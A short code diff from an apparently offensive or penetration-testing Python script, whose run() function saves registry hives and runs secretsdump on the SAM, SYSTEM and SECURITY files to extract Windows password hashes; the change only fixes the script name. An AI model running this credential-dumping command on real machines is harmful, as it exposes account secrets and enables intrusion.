@@ -28,4 +28,4 @@ def save_registry():
 
 def run():
 	save_registry()
-	os.system("python secretsdump -sam sam -system system -security security LOCAL")
+	os.system("python secretsdump.py -sam sam -system system -security security LOCAL")
